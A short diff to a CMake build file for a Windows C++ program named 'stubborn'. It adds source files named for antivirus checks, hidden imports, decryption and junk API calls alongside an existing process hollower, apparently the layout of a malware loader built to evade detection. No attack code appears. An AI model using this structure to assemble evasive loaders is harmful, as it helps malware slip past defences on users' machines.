@@ -16,4 +16,4 @@ ENDIF(CMAKE_BUILD_TYPE MATCHES RELEASE)
 
 set(CMAKE_EXE_LINKER_FLAGS "-static-libgcc -static-libstdc++ -static -lpthread")
 
-add_executable(stubborn main.cpp resource.rc windowsInternals.h windowsInternals.cpp resource.h debug.cpp debug.h processHollower.cpp processHollower.h)
+add_executable(stubborn main.cpp resource.rc windowsInternals.h windowsInternals.cpp resource.h debug.cpp debug.h processHollower.cpp processHollower.h antivirusChecks.cpp antivirusChecks.h hiddenImports.cpp hiddenImports.h decrypt.cpp decrypt.h junkApiCalls.cpp junkApiCalls.h)
